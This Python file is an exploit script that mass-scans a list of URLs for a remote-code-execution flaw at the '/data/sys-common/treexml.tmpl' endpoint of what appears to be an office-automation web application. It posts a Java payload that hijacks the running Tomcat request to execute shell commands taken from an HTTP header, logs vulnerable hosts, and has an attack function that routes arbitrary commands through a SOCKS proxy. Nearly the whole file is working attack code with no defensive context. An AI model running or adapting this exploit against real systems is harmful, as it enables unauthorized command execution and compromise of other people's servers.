#coding:utf-8
from tqdm import tqdm
import requests

proxies={
    "http":"socks4://xxxxx:1356",
    "https":"socks4://xxxxx:1356",
}

def scan(url):
    v_url = url + "/data/sys-common/treexml.tmpl"
    cmd = "id"
    payload = {
        "s_bean":r'ruleFormulaValidate',
        "script":r'boolean flag = false;ThreadGroup group = Thread.currentThread().getThreadGroup();java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");f.setAccessible(true);Thread[] threads = (Thread[]) f.get(group);for (int i = 0; i < threads.length; i++) { try { Thread t = threads[i];if (t == null) { continue; }String str = t.getName();if (str.contains("exec") || !str.contains("http")) { continue; }f = t.getClass().getDeclaredField("target");f.setAccessible(true);Object obj = f.get(t);if (!(obj instanceof Runnable)) { continue; }f = obj.getClass().getDeclaredField("this$0");f.setAccessible(true);obj = f.get(obj);try { f = obj.getClass().getDeclaredField("handler"); } catch (NoSuchFieldException e) { f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler"); }f.setAccessible(true);obj = f.get(obj);try { f = obj.getClass().getSuperclass().getDeclaredField("global"); }catch (NoSuchFieldException e) { f = obj.getClass().getDeclaredField("global"); }f.setAccessible(true);obj = f.get(obj);f = obj.getClass().getDeclaredField("processors");f.setAccessible(true);java.util.List processors = (java.util.List) (f.get(obj));for (int j = 0; j < processors.size(); ++j) { Object processor = processors.get(j);f = processor.getClass().getDeclaredField("req");f.setAccessible(true);Object req = f.get(processor);Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"joe1sn"});if (str != null && !str.isEmpty()) { resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";byte[] text2 =(new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);byte[] result=("joe1sn:"+new String(text2,"utf-8")+":joe1sn").getBytes(charsetName);try { Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");obj = cls.newInstance();cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); } catch (NoSuchMethodException var5) { Class cls = Class.forName("java.nio.ByteBuffer");obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); }flag = true; }if (flag) { break; } }if (flag) { break; } } catch (Exception e) { continue; } }'
    }
    headers = {
        "Accept": "*/*",
        "joe1sn": cmd,
        "Content-Type": "application/x-www-form-urlencoded",
        "Expect": "100-continue",
        "Connection": "close",
    }
    # r = requests.post(v_url,headers=headers,data=payload,proxies=proxies)
    r = requests.post(v_url,headers=headers,data=payload)
    # print(r.text)
    if "joe1sn" in r.text:
        return True
    else:
        return False

def attack(url,cmd):
    v_url = url + "/data/sys-common/treexml.tmpl"
    payload = {
        "s_bean":r'ruleFormulaValidate',
        "script":r'boolean flag = false;ThreadGroup group = Thread.currentThread().getThreadGroup();java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");f.setAccessible(true);Thread[] threads = (Thread[]) f.get(group);for (int i = 0; i < threads.length; i++) { try { Thread t = threads[i];if (t == null) { continue; }String str = t.getName();if (str.contains("exec") || !str.contains("http")) { continue; }f = t.getClass().getDeclaredField("target");f.setAccessible(true);Object obj = f.get(t);if (!(obj instanceof Runnable)) { continue; }f = obj.getClass().getDeclaredField("this$0");f.setAccessible(true);obj = f.get(obj);try { f = obj.getClass().getDeclaredField("handler"); } catch (NoSuchFieldException e) { f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler"); }f.setAccessible(true);obj = f.get(obj);try { f = obj.getClass().getSuperclass().getDeclaredField("global"); }catch (NoSuchFieldException e) { f = obj.getClass().getDeclaredField("global"); }f.setAccessible(true);obj = f.get(obj);f = obj.getClass().getDeclaredField("processors");f.setAccessible(true);java.util.List processors = (java.util.List) (f.get(obj));for (int j = 0; j < processors.size(); ++j) { Object processor = processors.get(j);f = processor.getClass().getDeclaredField("req");f.setAccessible(true);Object req = f.get(processor);Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"joe1sn"});if (str != null && !str.isEmpty()) { resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";byte[] text2 =(new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);byte[] result=("joe1sn:"+new String(text2,"utf-8")+":joe1sn").getBytes(charsetName);try { Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");obj = cls.newInstance();cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); } catch (NoSuchMethodException var5) { Class cls = Class.forName("java.nio.ByteBuffer");obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); }flag = true; }if (flag) { break; } }if (flag) { break; } } catch (Exception e) { continue; } }'
    }
    headers = {
        "Accept": "*/*",
        "Tas9er": cmd,
        "Content-Length": "8722",
        "Content-Type": "application/x-www-form-urlencoded",
        "Expect": "100-continue",
        "Connection": "close",
    }
    r = requests.post(v_url,headers=headers,data=payload,proxies=proxies)
    exit()

def write_in(file="log.txt",v_url=""):
    with open(file,"a",encoding="utf-8") as f:
        f.writelines(v_url+"\n")

if __name__ == "__main__":
    f = open("url.txt","r")
    lines = len(f.readlines())
    f.close()
    with open("url.txt","r",encoding="utf-8") as f:
        # for i in tqdm(range(lines)):
        for i in range(lines):
            url = f.readline()[:-1]
            print(url)
            try:
                if scan(url):
                    write_in(v_url=url)
            except:
                write_in(file="error.log",v_url=url)